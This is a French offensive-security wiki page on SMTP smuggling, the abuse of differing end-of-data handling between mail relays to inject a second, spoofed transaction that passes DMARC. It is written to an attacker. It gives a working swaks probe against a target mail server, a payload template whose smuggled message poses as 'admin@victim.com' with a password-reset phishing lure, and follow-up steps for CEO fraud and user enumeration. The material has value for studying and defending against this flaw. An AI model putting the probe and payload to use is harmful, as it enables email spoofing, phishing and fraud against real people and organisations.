---
title: "SMTP smuggling : injecter des transactions usurpées via le désaccord entre relais"
description: "Lorsqu'un relais sortant et un serveur entrant divergent sur la séquence de fin de données, les octets que le relais sortant transmet littéralement sont traités comme une fin de données par le serveur entrant, de sorte que les données qui les suivent sont analysées comme une toute nouvelle transaction SMTP sur la même connexion de confiance, alignée SPF/DKIM, produisant un message entièrement usurpé qui passe DMARC."
keywords:
  - smtp smuggling
  - end of data
  - dmarc bypass
  - email spoofing
  - message boundary
---

# Smuggling

La phase DATA de SMTP se termine par une unique séquence canonique : `<CR><LF>.<CR><LF>` (une ligne ne contenant qu'un point). Le SMTP smuggling, publié par Timo Longin chez SEC Consult, exploite le fait que les implémentations divergent sur ce qui compte aussi comme cette frontière. Certains serveurs terminent aussi le message sur `<LF>.<LF>`, ou `<CR>.<CR>`, ou `<CR><LF>.<CR>`, acceptant une ligne-point à LF seul ou CR seul que la norme n'accepterait pas. Si vous relayez un message via un fournisseur sortant aligné SPF et DKIM pour son propre domaine, et y incorporez une variante de fin de données que le relais sortant transmet *littéralement* (il ne la traite pas comme la fin) mais que le serveur entrant *traite* bien comme la fin, alors le serveur entrant clôt votre message prévu prématurément et analyse ce que vous placez après comme un nouveau `MAIL FROM`/`RCPT TO`/`DATA` sur la même connexion. Cette connexion est toujours la session authentifiée et porteuse de réputation du fournisseur sortant, de sorte que le message smuggled hérite de son alignement SPF et DKIM et passe DMARC avec un expéditeur que vous avez choisi.

## Prérequis

- Un compte chez un fournisseur sortant dont le relais est permissif quant à la séquence de fin de données (la moitié sortante doit transmettre votre ligne-point forgée sans la modifier à l'intérieur de DATA).
- Une cible dont le serveur entrant honore une variante de fin de données non standard (la moitié entrante doit terminer prématurément dessus).
- Le domaine usurpable n'est pas arbitraire. L'enveloppe smuggled n'obtient un passage SPF aligné que si l'enregistrement SPF de ce domaine autorise l'adresse IP du relais d'origine, de sorte qu'en pratique vous usurpez des domaines hébergés par le même fournisseur sortant ou le partageant (colocataires, ou domaines propres du fournisseur). DKIM n'est pas hérité du message porteur, de sorte que l'expéditeur smuggled repose sur le seul DMARC basé sur SPF.

Identifiez directement le traitement de la fin de données du serveur entrant : envoyez un message dont le DATA incorpore une ligne-point non standard suivie d'une seconde enveloppe complète, et voyez si la cible reçoit un message ou deux.

```bash
swaks --server mx.victim.com --to probe@victim.com --from you@aligned.com \
      --data $'From: you@aligned.com\r\nSubject: probe\r\n\r\nbody-one\n.\nMAIL FROM:<spoof@victim.com>\r\nRCPT TO:<probe@victim.com>\r\nDATA\r\nFrom: spoof@victim.com\r\nSubject: smuggled\r\n\r\nbody-two\r\n.\r\n'
# probe@victim.com receives TWO messages (the second From: spoof@victim.com) => the inbound MX
# terminated DATA on the bare-LF dot line and is smugglable; ONE message => it does not honor it
```

Cela ne teste que la moitié entrante. L'attaque de bout en bout a aussi besoin d'un relais sortant qui transmet `<LF>.<LF>` littéralement à l'intérieur de DATA, ce que vous confirmez séparément en envoyant le même message forgé via votre fournisseur vers une boîte aux lettres que vous contrôlez et en vérifiant qu'il arrive intact plutôt que normalisé ou scindé au relais.

## Charge utile guidée

Vous soumettez un message via le relais sortant aligné. Son DATA contient un terminateur non standard anticipé, puis la seconde transaction smuggled :

```text
MAIL FROM:<you@aligned.com>
RCPT TO:<you@aligned.com>
DATA
From: you@aligned.com
Subject: carrier

carrier body
<LF>.<LF>                         <- lone-LF dot: inbound server treats this as END OF DATA
MAIL FROM:<admin@victim.com>      <- parsed by inbound as a NEW transaction on the trusted conn
RCPT TO:<target@victim.com>
DATA
From: admin@victim.com
Subject: Mandatory password reset
To: target@victim.com

Click the portal link and re-authenticate.
.
```
Le relais sortant voit `<LF>.<LF>` comme du texte de corps ordinaire et transmet tout comme un seul message ; le serveur entrant s'arrête à `<LF>.<LF>`, puis lit le bloc `MAIL FROM:<admin@victim.com>` comme un véritable nouveau message arrivant sur la session alignée. Le message smuggled ne porte aucune signature DKIM pour `victim.com`, de sorte qu'il survit à DMARC uniquement lorsque le SPF de `victim.com` autorise le relais d'origine (par exemple lorsque `victim.com` et le fournisseur sortant partagent une infrastructure) ; là où c'est le cas, le passage SPF aligné sur l'enveloppe smuggled suffit pour DMARC et `target@victim.com` reçoit un courrier qui semble provenir de `admin@victim.com`.

Choisissez la variante par destinataire à partir de l'étape d'identification : utilisez `<LF>.<LF>` contre les serveurs entrants qui acceptent le LF seul, `<CR>.<CR>` ou `<CR><LF>.<CR>` contre ceux qui acceptent le CR seul. La bonne variante est celle que l'entrant honore et que le sortant ignore.

## Suites

- Délivrez du courrier usurpé d'apparence interne pour la fraude au président, les leurres de réinitialisation de mot de passe, ou la fraude à l'approbation qui survit à DMARC, ce qu'une usurpation par [open relay](open-relay.md) ne peut généralement pas.
- Enchaînez avec l'[énumération des utilisateurs](user-enumeration.md) pour adresser de vrais destinataires internes et avec des données d'organisation récoltées pour rendre le `From:` et le contenu smuggled convaincants.

## Outils

- [The-Login : outils SMTP Smuggling (PoC)](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [swaks](https://github.com/jetmore/swaks)

## Références

- [SEC Consult : SMTP smuggling, usurper des e-mails dans le monde entier](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [The-Login : outils SMTP Smuggling et détails techniques](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [RFC 5321 section 4.1.1.4 (séquence de fin de DATA)](https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4)
